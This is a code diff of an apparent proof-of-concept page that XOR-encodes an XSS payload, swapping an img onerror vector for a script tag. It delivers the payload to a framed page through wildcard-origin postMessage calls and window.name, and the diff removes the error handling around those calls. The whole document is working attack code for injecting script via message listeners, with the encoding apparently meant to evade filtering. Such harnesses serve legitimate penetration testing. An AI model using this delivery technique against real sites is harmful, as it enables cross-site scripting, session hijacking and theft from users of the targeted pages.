@@ -22,8 +22,7 @@
       return keyHex + encoded;
     }
 
-    // Changed payload to more reliable XSS vector
-    const xorPayload = "<img src=x onerror=alert('XSS from XOR')>";
+    const xorPayload = "<script>alert('XSS from XOR')</script>";
     const encodedXOR = xorEncode(xorPayload);
 
     iframe.onload = () => {
@@ -38,21 +37,16 @@
           ]
         }
       };
-      
-      try {
-        iframe.contentWindow.postMessage(structuredPayload, "*");
-        console.log("🚀 Structured object postMessage sent.");
+      iframe.contentWindow.postMessage(structuredPayload, "*");
+      console.log("🚀 Structured object postMessage sent.");
 
-        // ✅ Send XOR-encoded payload via postMessage
-        iframe.contentWindow.postMessage(encodedXOR, "*");
-        console.log("🚀 XOR payload sent via postMessage");
+      // ✅ Send XOR-encoded payload via postMessage
+      iframe.contentWindow.postMessage(encodedXOR, "*");
+      console.log("🚀 XOR payload sent via postMessage");
 
-        // ✅ Also set window.name for any listener inside iframe
-        iframe.contentWindow.name = encodedXOR;
-        console.log("🧠 window.name set.");
-      } catch (e) {
-        console.error("Error sending payloads:", e);
-      }
+      // ✅ Also set window.name for any listener inside iframe
+      iframe.contentWindow.name = encodedXOR;
+      console.log("🧠 window.name set.");
     };
   </script>
 </body>
